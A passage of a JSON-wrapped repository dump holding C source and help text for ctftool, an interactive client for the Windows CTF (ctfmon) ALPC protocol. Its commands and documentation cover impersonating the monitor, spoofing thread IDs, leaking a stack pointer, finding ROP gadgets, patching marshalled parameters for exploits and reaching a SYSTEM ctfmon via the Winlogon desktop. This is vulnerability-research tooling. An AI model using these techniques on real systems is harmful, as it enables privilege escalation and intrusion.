1;\r\n    }\r\n\r\n    // Parse as a hex string, e.g. 41414141412eff00\r\n    for (Size = 0; *ByteString;) {\r\n        BYTE CurrentChar[3] = {0};\r\n        CurrentChar[0] = *ByteString++;\r\n        CurrentChar[1] = *ByteString++;\r\n        #pragma warning(suppress: 6328)\r\n        if (sscanf(CurrentChar, \"%hhx\", &HexBuf[Size++]) != 1) {\r\n            LogMessage(stderr, \"Parsing hex string but failed, I stopped at %s\", CurrentChar);\r\n            return 1;\r\n        }\r\n    }\r\n\r\n    Result = FindGadgetOffset(*Parameters, HexBuf, Size);\r\n\r\n    if (Result >= 0) {\r\n        LogMessage(stderr, \"Found Gadget %.6s... in module %s at offset %#llx\", Parameters[1], Parameters[0], Result);\r\n    } else {\r\n        LogMessage(stderr, \"Gadget %.6s... not found in module %s\", Parameters[1], Parameters[0]);\r\n    }\r\n\r\n    LastGadget = Result;\r\n\r\n    return 1;\r\n}\r\n\r\nULONG CallHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    CTF_MSGBASE Message;\r\n    HRESULT Result;\r\n\r\n    ZeroMemory(&Message, sizeof Message);\r\n\r\n    Message.SrcThreadId = ClientThreadId;\r\n    Message.DstThreadId = DecodeIntegerParameter(Parameters[0]);\r\n\r\n    // Check if this is a protocol constant.\r\n    if (GetCommandNum(Parameters[1]) >= 0) {\r\n        Message.Message = GetCommandNum(Parameters[1]);\r\n    } else {\r\n        Message.Message = DecodeIntegerParameter(Parameters[1]);\r\n    }\r\n\r\n    switch (ParamCount) {\r\n        case 6: {\r\n            // Note that there is no fourth parameter in the protocol, but\r\n            // there is slack space in the structure because one of the union\r\n            // members is a pointer.\r\n            #pragma warning(suppress: 6201 6386)\r\n            Message.Params[3] = DecodeIntegerParameter(Parameters[5]);\r\n        }\r\n        case 5: Message.Params[2] = DecodeIntegerParameter(Parameters[4]);\r\n        case 4: Message.Params[1] = DecodeIntegerParameter(Parameters[3]);\r\n        case 3: Message.Params[0] = DecodeIntegerParameter(Parameters[2]);\r\n    }\r\n\r\n    // DstThreadId zero means monitor, but I also use it for default :(\r\n    if (Message.DstThreadId == 0 && DefaultThread != 0) {\r\n        Message.DstThreadId = DefaultThread;\r\n    }\r\n\r\n    LogMessage(stdout, \"Message: %#x\", Message.Message);\r\n    LogMessage(stdout, \"Parameters In [ %08x %08X %08X ]\",\r\n                        Message.Params[0],\r\n                        Message.Params[1],\r\n                        Message.Params[2]);\r\n\r\n    Result = SendReceivePortMessage(PortHandle,\r\n                                   &Message.Header,\r\n                                    sizeof Message,\r\n                                    NULL);\r\n\r\n    if (Result != 0) {\r\n        LogMessage(stderr, \"failed to send message to server, %#x\", Result);\r\n        goto cleanup;\r\n    }\r\n\r\n    LogMessage(stdout, \"Result: %#x\", Message.Result);\r\n    LogMessage(stdout, \"Parameters Out: [ %08x %08X %08X ]\",\r\n                        Message.Params[0],\r\n                        Message.Params[1],\r\n                        Message.Params[2]);\r\n\r\n    hexdump(&Message, sizeof Message);\r\n\r\ncleanup:\r\n    return 1;\r\n}\r\n\r\nULONG DispatchCommand(PCHAR CommandLine)\r\n{\r\n    ULONG Result = 2;\r\n    PCHAR Command;\r\n    ULONG ParamCount;\r\n    PCHAR Parameters[MAX_PARAM] = {0};\r\n    ULONG TotalCommands = _countof(CommandHandlers);\r\n    PCOMMAND_HANDLER Handler;\r\n\r\n    // Check for comment\r\n    if (*CommandLine == '#')\r\n        return 1;\r\n\r\n    // Make a copy of CommandLine we can modify.\r\n    CommandLine = strdup(CommandLine);\r\n\r\n    // Tokenize CommandLine.\r\n    Command = strtok(CommandLine, \" \\t\\n\");\r\n    for (ParamCount = 0; ParamCount < MAX_PARAM; ParamCount++) {\r\n        if ((Parameters[ParamCount] = strtok(NULL, \" \\t\\n\")) == NULL)\r\n            break;\r\n    }\r\n\r\n    // Find a handler.\r\n    if (Command) {\r\n        #pragma warning(push)\r\n        #pragma warning(disable : 4090 4028)\r\n        Handler = _lfind(Command,\r\n                         CommandHandlers,\r\n                         &TotalCommands,\r\n                         sizeof(*CommandHandlers),\r\n                         CompareFirst);\r\n        #pragma warning(pop)\r\n\r\n        if (Handler) {\r\n            if (ParamCount >= Handler->MinParams) {\r\n                Result = Handler->Callback(Command, ParamCount, Parameters);\r\n            } else {\r\n                LogMessage(stderr, \"Command '%s' Requires at least %u Parameters\",\r\n                                    Command,\r\n                                    Handler->MinParams);\r\n            }\r\n        } else {\r\n            LogMessage(stderr, \"Unrecognised Command '%s'\", Command);\r\n        }\r\n    }\r\n\r\ncleanup:\r\n    free(CommandLine);\r\n    return Result;\r\n}\r\n\r\n"
        },
        {
          "name": "command.h",
          "type": "blob",
          "size": 5.037109375,
          "content": "#ifndef __COMMAND_H\r\n#define __COMMAND_H\r\n\r\n#define MAX_PARAM 32\r\n#define MAX_STUBS 32\r\n#define MAX_BUF 8192\r\n\r\n// We remember stub data so user only has to remember ID and thread.\r\ntypedef struct _STUB_RECORD {\r\n    DWORD ThreadId;\r\n    CTF_MARSHAL_COMSTUB Stub;\r\n} STUB_RECORD, *PSTUB_RECORD;\r\n\r\ntypedef struct _COMMAND_HANDLER {\r\n    PCHAR Command;\r\n    ULONG MinParams;\r\n    PCHAR LongDescription;\r\n    PCHAR Description;\r\n    ULONG (*Callback)(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\n} COMMAND_HANDLER, *PCOMMAND_HANDLER;\r\n\r\ntypedef struct _SPECIAL_VARIABLE {\r\n    PCHAR Name;\r\n    PCHAR Description;\r\n    ULONGLONG Value;\r\n} SPECIAL_VARIABLE, *PSPECIAL_VARIABLE;\r\n\r\n// If you specify a tid of 0, the DefaultThread is used, which can be set\r\n// via wait or thread commands.\r\nextern UINT64 DefaultThread;\r\n\r\n// If you specify a stubid of 0, the last stub created is used (Note that\r\n// msctf will never return a 0 stubid).\r\nextern UINT64 DefaultStub;\r\n\r\n// The handle to the monitor.\r\nextern HANDLE PortHandle;\r\n\r\n// We create a window to monitor RPC commands.\r\nextern HWND MessageWindow;\r\n\r\n// The monitor leaks a stack pointer on every marshal command.\r\n// This might be useful in exploitation, so you can retrieve it if you want it.\r\nextern UINT64 LeakedStackPointer;\r\n\r\nextern UINT64 LastModuleBase;\r\n\r\nextern UINT64 LastSymbolOffset;\r\n\r\n// How many stubs we know about.\r\nextern ULONG NumStubs;\r\n\r\n// Known stubs.\r\nextern STUB_RECORD StubRecords[MAX_STUBS];\r\n\r\n// Total number of parameters in the current parameter chain.\r\nextern ULONG CountMarshalParams;\r\n\r\n// How many of the total parameters have been specified.\r\nextern ULONG CurrentMarshalParam;\r\n\r\n// Pointer to the current parameter chain.\r\nextern PCTF_MARSHAL_PARAM MarshalParams;\r\n\r\n// The ThreadID we are claiming to be, by default it's the truth, but you can\r\n// lie if you like.\r\nextern UINT64 ClientThreadId;\r\n\r\n// The flags we set when we connect.\r\nextern UINT64 ClientFlags;\r\n\r\n// Set when we're running a script.\r\nextern ULONG NonInteractive;\r\n\r\n// Padding for the PROXY_SIGNATURE.\r\nextern UINT64 ProxyExtra1;\r\nextern UINT64 ProxyExtra2;\r\nextern UINT64 ProxyExtra3;\r\n\r\n// User specified variables for scripting.\r\nextern ULONGLONG UserRegisters[6];\r\n\r\n// The return code of the last process from \"run\"\r\nextern ULONGLONG LastCommandResult;\r\n\r\n// The last value looked up in the registry.\r\nextern ULONGLONG LastRegistryValue;\r\n\r\nULONG ExitHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG HelpHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG ConnectHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG InfoHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG ScanHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG CreateStubHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG CallStubHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG SetArgHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG GetArgHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG HijackHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG WaitHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG ThreadHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG SleepHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG ForgetHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG StackHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG MarshalHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG ProxyHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG CallHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG PatchHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG ModuleHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG ModuleHandler64(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG EditArgHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG SymbolHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG SetHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG ShowHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG LockHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG RepeatHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG RunHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG ScriptHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG PrintHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG ConsentHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG RegHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG WindowHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG GadgetHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\nULONG SectionHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters);\r\n\r\nULONG DispatchCommand(PCHAR CommandLine);\r\nint CompareFirst(PCHAR a, PCHAR *b);\r\nULONGLONG DecodeIntegerParameter(PCHAR Value);\r\nHWND CreateMessageWindow();\r\n\r\n#endif\r\n"
        },
        {
          "name": "commanddoc.h",
          "type": "blob",
          "size": 18.84375,
          "content": "#ifndef __COMMANDDOC_H\r\n#define __COMMANDDOC_H\r\n\r\n#define THREAD_PARAM_HELP                                                      \\\r\n    \"THREAD must be a client connected to the monitor, use \\\"scan\\\" to list\\n\" \\\r\n    \"available clients. However, if THREAD is the special value 0 then the\\n\"  \\\r\n    \"default thread is used, see \\\"thread\\\" and \\\"wait\\\" for details.\\n\\n\"     \\\r\n\r\n#define GUID_PARAM_HELP                                                        \\\r\n    \"GUID should be in the form 41414141-4141-4141-4141-414141414141.\\n\\n\"\r\n\r\nconst static char HelpDoc[] =\r\n    \"Usage: help [COMMAND]\\n\"\r\n    \"Without any parameters, help lists all available commands and a brief\\n\"\r\n    \"description of usage. If COMMAND is specified, print detailed command\\n\"\r\n    \"usage information.\";\r\n\r\nconst static char ExitDoc[] =\r\n    \"Usage: exit\\n\"\r\n    \"Immediately exit ctftool, aliases quit and q also work.\";\r\n\r\nconst static char ConnectDoc[] =\r\n    \"Usage: connect [DESKTOPNAME SESSIONID]\\n\"\r\n    \"Without any parameters, connect to the ctf monitor for the current\\n\"\r\n    \"desktop and session. All subsequent commands will use this connection\\n\"\r\n    \"for communicating with the ctf monitor.\\n\\n\"\r\n    \"If a connection is already open, the existing connection is closed first.\"\r\n    \"\\n\\n\"\r\n    \"If DESKTOPNAME and SESSIONID are specified, a connection to ctf monitor\\n\"\r\n    \"for another desktop and session are opened, if it exists.\\n\"\r\n    \"If the specified port does not exist, wait until it does exist. This is\\n\"\r\n    \"so that you can wait for a session that hasn't started\\n\"\r\n    \"yet in a script.\\n\"\r\n    \"Examples\\n\"\r\n    \" Connect to the monitor for current desktop\\n\"\r\n    \"  ctf> connect\\n\"\r\n    \" Connect to a specific desktop and session.\\n\"\r\n    \"  ctf> connect Default 1\";\r\n\r\nconst static char InfoDoc[] =\r\n    \"Usage: info\\n\"\r\n    \"Query and print all available information from the monitor.\";\r\n\r\nconst static char ScanDoc[] =\r\n    \"Usage: scan\\n\"\r\n    \"Enumerate all threads connected to the monitor.\\n\"\r\n    \"Many commands require a client thread ID, scan lists these and the\\n\"\r\n    \"associated process.\\n\";\r\n\r\nconst static char CallStubDoc[] =\r\n    \"Usage: callstub THREAD STUBID FUNCTION\\n\"\r\n    \"Invoke a function on an instantiated COM object in the specified THREAD.\\n\"\r\n    \"\\n\"\r\n    \"Note: This command sends the current parameter chain to the server, see\\n\"\r\n    \"the \\\"setarg\\\" command for details, and run \\\"setarg 0\\\" if you want\\n\"\r\n    \"to discard any active parameters.\\n\\n\"\r\n\r\n    THREAD_PARAM_HELP\r\n\r\n    \"STUBID must be an id returned by the \\\"createstub\\\" command.\\n\"\r\n    \"However, if STUBID is 0, then the last created stub is used. This allows\\n\"\r\n    \"simple scripting, as you wont know the STUBID in advance.\\n\\n\"\r\n\r\n    \"FUNCTION is an integer indicating which function you want the client to\\n\"\r\n    \"invoke.\\n\\n\"\r\n\r\n    \"Examples\\n\"\r\n    \" Set the default thread to the first notepad.exe client connected, then\\n\"\r\n    \" create a stubid with createstub and a parameter chain with setarg and\\n\"\r\n    \" then call function index 3.\\n\"\r\n    \" Note the usage of 0 to use default thread and stub.\\n\\n\"\r\n    \"  wait notepad.exe\\n\"\r\n    \"  createstub 0 4 IID_ITfInputProcessorProfileMgr\\n\"\r\n    \"  setarg 6\\n\"\r\n    \"  setarg 0x201 0x41414141\\n\"\r\n    \"  setarg 0x20001 0x41414142\\n\"\r\n    \"  setarg 0x1 ABABABAB-ABAB-ABAB-ABAB-ABABABABABAB\\n\"\r\n    \"  setarg 0x1 BCBCBCBC-BCBC-BCBC-BCBC-BCBCBCBCBCBC\\n\"\r\n    \"  setarg 0x10001 0x41414145\\n\"\r\n    \"  setarg 0x201 0x41414146\\n\"\r\n    \"  callstub 0 0 3\";\r\n\r\nconst static char CreateStubDoc[] =\r\n    \"Usage: createstub THREAD TYPE GUID\\n\"\r\n    \"   or: createstub THREAD TYPE INTERFACENAME\\n\"\r\n    \"Ask a client to instantiate a COM object with specified CLSID.\\n\\n\"\r\n\r\n    \"A stub is an instantiated COM object, you can call remote methods on it\\n\"\r\n    \"using \\\"callstub\\\", and pass it parameters with \\\"setarg\\\". If the\\n\"\r\n    \"command is successful, the client will give you a stubid, timestamp and\\n\"\r\n    \"the guid of the object created. These are required for interaction with\\n\"\r\n    \"the object, but ctfmon remembers them so you only need the stubid.\\n\\n\"\r\n\r\n    THREAD_PARAM_HELP\r\n\r\n    \"TYPE is an integer object subtype interpreted by the client, in the\\n\"\r\n    \"range 0 - 4 (I think?), some objects ignore this number but it is\\n\"\r\n    \"always required.\\n\\n\"\r\n\r\n    GUID_PARAM_HELP\r\n\r\n    \"Alternatively, you may specify INTERFACENAME instead of GUID, if you\\n\"\r\n    \"know it (e.g. IID_ITfInputProcessorProfileSubstituteLayout).\\n\"\r\n\r\n    \"Examples\\n\"\r\n    \" Use an interfacename to instantiate an object (subtype 4) in thread 1234\\n\"\r\n    \"  createstub 1234 4 IID_ITfInputProcessorProfileMgr\\n\"\r\n    \" Use a GUID to instantiate an object in the default thread\\n\"\r\n    \"  createstub 0 2 ABABABAB-ABAB-ABAB-ABAB-ABABABABABAB\";\r\n\r\nconst static char HijackDoc[] =\r\n    \"Usage: hijack DESKTOPNAME SESSION\\n\"\r\n    \"Pretend to be the monitor for the specified DESKTOPNAME and SESSION,\\n\"\r\n    \"Dump information from connecting clients.\\n\"\r\n    \"Note that you will need to interrupt (ctrl-c) to stop.\\n\"\r\n    \"Examples\\n\"\r\n    \" Pretend to be the server for the next session\\n\"\r\n    \"  hijack Default 2\\n\";\r\n\r\nconst static char SetArgDoc[] =\r\n    \"Usage: setarg COUNT\\n\"\r\n    \"   or: setarg [TYPEFLAGS...] VALUE\\n\"\r\n    \"The ctf monitor and clients support the concept of marshaling and\\n\"\r\n    \"unmarshaling types across the ALPC transport. For example, you want to\\n\"\r\n    \"call an RPC with different params like ints, strings, guids, handles,\\n\"\r\n    \"etc. These all have to be marshalled by the sender, and unmarshalled by\\n\"\r\n    \"the receiver. The process is reversed to retrieve the result.\\n\\n\"\r\n\r\n    \"In general, ctf clients and servers reuse the same buffer for responses.\\n\"\r\n    \"\\n\"\r\n    \"All commands that require marshalled parameters use the current chain\\n\"\r\n    \"created by setarg, there can only be one chain active at a time. You\\n\"\r\n    \"can query the existing chain with \\\"getarg\\\".\\n\\n\"\r\n\r\n    \"COUNT is used to create a new chain of the specified length, discarding\\n\"\r\n    \"any existing chain. The size of the chain must be known in advance, and\\n\"\r\n    \"you cannot alter the size of an existing chain. ctftool warns you if you\\n\"\r\n    \"try to do this.\\n\\n\"\r\n\r\n    \"TYPEFLAGS is the combined type and flags for this type, e.g. 0x201\\n\"\r\n    \"0x200 is an integer, and 0x01 specified an input. If more than one\\n\"\r\n    \"flag is specified, they are OR'd together. Some symbolic names are\\n\"\r\n    \"suported, such as MARSHAL_TYPE_COM.\\n\"\r\n\r\n    \"VALUE is the type-specific value for this parameter, e.g. an integer\\n\"\r\n    \"string or handle value.\\n\\n\"\r\n\r\n    \"When specifying a type that accepts arbitrary data, setarg attempts to\\n\"\r\n    \"parse VALUE as a GUID, a string if it is surrouded by quotes, and then\\n\"\r\n    \"a sequence of hex bytes. An error is returned if the type cannot be parsed.\\n\"\r\n\r\n    \"Examples\\n\"\r\n    \" To create a parameter chain, first tell ctfmon how many entries there\\n\"\r\n    \" are. This must be known before you push values onto the chain.\\n\"\r\n    \"  ctf> setarg 2\\n\"\r\n    \"  New Parameter Chain, Length 2\\n\"\r\n    \" Now you have an empty chain of 2 parameters, you cant query them yet\\n\"\r\n    \" because the size isn't known, e.g.\\n\"\r\n    \"  ctf> setarg 2\\n\"\r\n    \"  New Parameter Chain, Length 2\\n\"\r\n    \"  ctf> getarg 0\\n\"\r\n    \"  Bad index requested!\\n\"\r\n    \" Now you can fill in the parameters, it must be in order.\\n\"\r\n    \"  ctf> setarg 0x201 0x12345\\n\"\r\n    \" This marshals an input integer, and sets it's value to 0x12345.\\n\\n\"\r\n    \"I know this is complicated...sorry!\\n\";\r\n\r\nstatic const char GetArgDoc[] =\r\n    \"Usage: getarg INDEX\\n\"\r\n    \"Print information about the marshalled parameter INDEX. This can be used\\n\"\r\n    \"for debugging paramters you created with \\\"setarg\\\", or dumping output\\n\"\r\n    \"parameters from the monitor.\\n\"\r\n    \"see \\\"setarg\\\" for more thorough documentation.\\n\";\r\n\r\nstatic const char WaitDoc[] =\r\n    \"Usage: wait IMAGENAME [MILLISECONDS]\\n\"\r\n    \"Like the \\\"scan\\\" command, but halts execution until a client matching\\n\"\r\n    \"IMAGENAME connects, and then sets the default thread to the matching\\n\"\r\n    \"client. This can be used for scripting.\\n\\n\"\r\n    \"If MILLISECONDS is specified, wait the specified time between\\n\"\r\n    \"polling for new clients (default=5000).\\n\"\r\n    \"Examples\\n\"\r\n    \" Wait for notepad to connect, then show that notepad is the new default\\n\"\r\n    \" thread.\\n\"\r\n    \"  ctf> wait notepad.exe\\n\"\r\n    \"  Found new client notepad.exe, DefaultThread now 6284\\n\"\r\n    \"  ctf> thread\\n\"\r\n    \"  Default thread is 6284\\n\";\r\n\r\nstatic const char ThreadDoc[] =\r\n    \"Usage: thread\\n\"\r\n    \"Show the current default thread. This is the value used when you\\n\"\r\n    \"specify a thread id of zero to commands that require one.\\n\"\r\n    \"If you really want a destination thread of 0, for example to\\n\"\r\n    \"send commands to the monitor, use `thread 0`.\\n\";\r\n\r\nstatic const char SleepDoc[] =\r\n    \"Usage: sleep MILLISECONDS\\n\"\r\n    \"Sleep the specified number of MILLISECONDS, useful for scripting.\\n\";\r\n\r\nstatic const char ForgetDoc[] =\r\n    \"Usage: forget\\n\"\r\n    \"Reset all known stubs, for example, if you are no longer interested\\n\"\r\n    \"in this thread. This is useful when monitoring a new thread with\\n\"\r\n    \"\\\"wait\\\" while scripting.\";\r\n\r\nstatic const char StackDoc[] =\r\n    \"Usage: stack\\n\"\r\n    \"When you marshal parameters to the monitor, it uses some slack space\\n\"\r\n    \"in the PORT_MESSAGE to store a temporary pointer. That pointer is not\\n\"\r\n    \"cleared before it replies, so we can learn the stack address.\\n\\n\"\r\n    \"On Windows, image randomization is per-boot, but stack randomization is\\n\"\r\n    \"per-exec, so this might be useful in exploitation.\\n\";\r\n\r\nstatic const char CallDoc[] =\r\n    \"Usage: call THREAD MESSAGE [PARAM...]\\n\"\r\n    \"Send a command to the monitor without appended data. You can still set\\n\"\r\n    \"the message parameters, many commands require this.\\n\\n\"\r\n\r\n    THREAD_PARAM_HELP\r\n\r\n    \"MESSAGE is the number or name of the command you wish to send, with any\\n\"\r\n    \"required flags.\\n\\n\"\r\n\r\n    \"PARAM are optional DWORD parameters that are part of the message\\n\"\r\n    \"structure. You can specify up to 3, others are ignored.\\n\"\r\n    \"Examples\\n\"\r\n    \" Find the pid of the monitor\\n\"\r\n    \"  ctf> thread 0\\n\"\r\n    \"  ctf> call 0 0x38\\n\";\r\n\r\nstatic const char MarshalDoc[] =\r\n    \"Usage: marshal THREAD MESSAGE\\n\"\r\n    \"Send a command to the monitor with the current argument chain appended.\\n\"\r\n    \"See the commands `setarg` and `getarg` for controlling the current\\n\"\r\n    \"argument chain.\\n\"\r\n    \"You cannot specify message parameters, because the protocol for\\n\"\r\n    \"marshalled data doesnt have in-mesage parameters.\\n\\n\"\r\n\r\n    THREAD_PARAM_HELP\r\n\r\n    \"MESSAGE is the number or name of the command you wish to send, with any\\n\"\r\n    \"required flags.\\n\\n\"\r\n    \"Examples\\n\"\r\n    \" Implement the `createstub` command manually.\\n\"\r\n    \"  ctf> setarg 4\\n\"\r\n    \"  ctf> setarg 0x201 0\\n\"\r\n    \"  ctf> setarg 0x201 4\\n\"\r\n    \"  ctf> setarg 1 71C6E74D-0F28-11D8-A82A-00065B84435C\\n\"\r\n    \"  ctf> setarg 0x106 00000000-0000-0000-0000-000000000000\\n\"\r\n    \"  ctf> marshal 0 11\\n\"\r\n    \"  Result: 0, use `getarg` if you want to examine data\\n\"\r\n    \"  ctf> getarg 3\\n\"\r\n    \"  Dumping Marshal Parameter 3 (Base 00929470, Type 0x106, Size 0x18, Offset 0x40)\\n\"\r\n    \"  000000: 4d e7 c6 71 28 0f d8 11 a8 2a 00 06 5b 84 43 5c  M..q(....*..[.C\\\\\\n\"\r\n    \"  000010: 02 00 00 00 67 68 ff 06                          ....gh..\\n\"\r\n    \"  Marshalled Value 3, COM {71C6E74D-0F28-11D8-A82A-00065B84435C}, ID 2, Timestamp 0x6ff6867\\n\"\r\n    \"\\n\"\r\n    \" Now you can see the monitor stack address if you like.\\n\"\r\n    \" ctf> stack\\n\";\r\n\r\nstatic const char ModuleDoc[] =\r\n    \"Usage: module NAME\\n\"\r\n    \"   or  module64 NAME\\n\"\r\n    \"Load the specific module and print it's address. ASLR is per-boot\\n\"\r\n    \"in Windows, so this address will be valid in other clients with the module\\n\"\r\n    \"loaded.\\n\"\r\n    \"NAME is a module name, for example \\\"kernel32\\\".\\n\";\r\n\r\nstatic const char PatchDoc[] =\r\n    \"Usage: patch INDEX OFFSET VALUE WIDTH [ADJUST [SHIFT]]\\n\"\r\n    \"Oh boy. If you need precise control over a marshalled parameter created\\n\"\r\n    \"with `setarg` then this command will let you modify them in such a way\\n\"\r\n    \"that would usually be illegal or or unsupported. You might want to do this\\n\"\r\n    \"for exploitation or testing.\\n\"\r\n    \"\\n\"\r\n    \"INDEX is the parameter number, it must be a valid index in the current\\n\"\r\n    \"parameter chain. See `getarg` and `setarg` for more.\\n\"\r\n    \"OFFSET is the byte index into the parameter you want to start modifying.\\n\"\r\n    \"VALUE is the new value you want to replace the current value. This can be\\n\"\r\n    \"a special value, see the \\\"show\\\" command for a complete list.\\n\"\r\n    \"WIDTH is the size in bytes you want written, any additional bits in VALUE\\n\"\r\n    \"are simply discarded.\\n\"\r\n    \"ADJUST and SHIFT are both optional parameters. ADJUST is added to VALUE\\n\"\r\n    \"before the patch operation, it is intended for scripting. SHIFT will right\\n\"\r\n    \"shift VALUE *after* ADJUST is added.\\n\"\r\n    \"If you want to use SHIFT without any adjustment, specify an ADJUST of zero.\\n\"\r\n    \"The purpose of SHIFT is you might want to reorder the bytes of a larger\\n\"\r\n    \"value, or distribute them differently for an exploit. With SHIFT you can\\n\"\r\n    \"extract one byte at a time and insert at a different OFFSET.\\n\"\r\n    \"\\n\"\r\n    \"Examples:\\n\"\r\n    \"Create a GUID parameter, and patch the first byte.\\n\"\r\n    \"  ctf> setarg 1\\n\"\r\n    \"  New Parameter Chain, Length 1\\n\"\r\n    \"  ctf> setarg 0 41414141-4141-4141-4141-414141414141\\n\"\r\n    \"  Marshalled Value 0, GUID {41414141-4141-4141-4141-414141414141}\\n\"\r\n    \"  ctf> patch 0 0 0 1\\n\"\r\n    \"  Dumping Original...\\n\"\r\n    \"  000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\\n\"\r\n    \"  Marshalled Value 0, GUID {41414141-4141-4141-4141-414141414141}\\n\"\r\n    \"  Dumping New...\\n\"\r\n    \"  000000: 00 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  .AAAAAAAAAAAAAAA\\n\"\r\n    \"  Marshalled Value 0, GUID {41414100-4141-4141-4141-414141414141}\\n\";\r\n\r\nstatic const char EditArgDoc[] =\r\n    \"Usage: editarg INDEX TYPE\\n\"\r\n    \"Change the type of parameter INDEX to TYPE\\n\"\r\n    \"See `setarg` and `getarg` for more information. See also `patcharg`.\\n\"\r\n    \"Note that you can create invalid parameters with this command, no attempt\\n\"\r\n    \"is made to validate what you enter.\\n\";\r\n\r\nstatic const char SymbolDoc[] =\r\n    \"Usage: symbol MODULE!SYMBOL\\n\"\r\n    \"Attempt to find the offset of SYMBOL from MODULE base, see `module` and\\n\"\r\n    \"`module64` to find the module load address. This is non-trivial, because\\n\"\r\n    \"we handle 32bit and 64bit modules.\\n\\n\"\r\n    \"This is not intended to be a debugger and doesnt handle everything!\\n\\n\"\r\n    \"You can specify a module like KERNEL32 or a path like\\n\"\r\n    \"C:\\\\WINDOWS\\\\MODULE.DLL, and ctftool will attempt to do the right thing.\\n\"\r\n    \"Note that WoW redirection is disabled for this feature, so if you really\\n\"\r\n    \"want the 32 bit module on x64, use C:\\\\WINDOWS\\\\SYSWOW64\\\\MODULE.DLL.\\n\"\r\n    \"You might need this when exploiting with a 32bit WoW client on x64.\\n\"\r\n    \"The offset learned can be used in scripts with the `patch` command.\\n\";\r\n\r\nstatic const char SetDoc[] =\r\n    \"Usage: set [VARIABLE [VALUE]]\\n\"\r\n    \"   or  add [VARIABLE [VALUE]]\\n\"\r\n    \"   or  sub [VARIABLE [VALUE]]\\n\"\r\n    \"   or  neg [VARIABLE [VALUE]]\\n\"\r\n    \"   or  shl [VARIABLE [VALUE]]\\n\"\r\n    \"   or  shr [VARIABLE [VALUE]]\\n\"\r\n    \"   or  and [VARIABLE [VALUE]]\\n\"\r\n    \"   or  or  [VARIABLE [VALUE]]\\n\"\r\n    \"   or  xor [VARIABLE [VALUE]]\\n\"\r\n    \"   or  not [VARIABLE [VALUE]]\\n\"\r\n    \"   or  eq  [VARIABLE [VALUE]]\\n\"\r\n    \"View or change ctftool variables.\\n\\n\"\r\n    \"VARIABLE is the name of an internal variable. Run set without any parameters\\n\"\r\n    \"to see a list of variables available.\\n\\n\"\r\n    \"You may optionally change the value by specifying a new VALUE.\\n\"\r\n    \"Additionally, There are 6 registers named r0-r5 that you may use for\\n\"\r\n    \"scripting.\\n\\n\"\r\n    \"Examples:\\n\"\r\n    \"Simple arithmetic with user registers.\"\r\n    \"  ctf> set r0 0x41414141\\n\"\r\n    \"  r0                   = 0x41414141\\n\"\r\n    \"  ctf> set r1 0x02020202\\n\"\r\n    \"  r1                   = 0x2020202\\n\"\r\n    \"  ctf> or r0 r1\\n\"\r\n    \"  r0                   = 0x43434343\\n\"\r\n    \"  ctf> shr r0 4\\n\"\r\n    \"  r0                   = 0x4343434\\n\";\r\n\r\nstatic const char ShowDoc[] =\r\n    \"Usage: show [NAME]\\n\"\r\n    \"Show the special variables you can use in commands. If NAME is specified,\\n\"\r\n    \"print its value.\\n\";\r\n\r\nstatic const char LockDoc[] =\r\n    \"Usage: lock\\n\"\r\n    \"Unprivileged users can switch to the privileged Winlogon desktop and session\\n\"\r\n    \"using USER32!LockWorkstation. After executing this, a SYSTEM privileged\\n\"\r\n    \"ctfmon will spawn.\\n\";\r\n\r\nstatic const char RepeatDoc[] = \r\n    \"Usage: repeat N command [PARAMS...]\\n\"\r\n    \"Repeat command N times, PARAMS are interpreted by the command specified.\\n\\n\"\r\n    \"There is a tunable setting called repeat-delay that can be changed with the\\n\"\r\n    \"set command which will pause between repeats, which is useful for debugging.\\n\";\r\n\r\nstatic const char RunDoc[] = \r\n    \"Usage: run [COMMAND]\\n\"\r\n    \"Launch a command. WoW64 redirection is disabled for the duration of this\\n\"\r\n    \"command to allow access to auto-escalate binaries like 